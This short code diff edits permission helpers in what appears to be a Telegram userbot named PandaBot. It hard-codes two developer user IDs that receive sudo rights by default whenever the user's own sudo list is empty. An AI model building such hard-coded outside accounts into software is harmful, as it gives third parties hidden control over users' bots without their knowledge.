@@ -57,10 +57,10 @@ vcClient = PandaBot
 DEV = [5057493677, 1593802955]
 
 def sudoers():
-    return _sudousers_list(), DEV
+    return _sudousers_list() or DEV
 
 def owner_and_sudos():
-    return [str(PandaBot.uid), *sudoers(), *DEV]
+    return [str(PandaBot.uid), *sudoers()]
 
 
 def html_mention(event, sender_id=None, full_name=None):
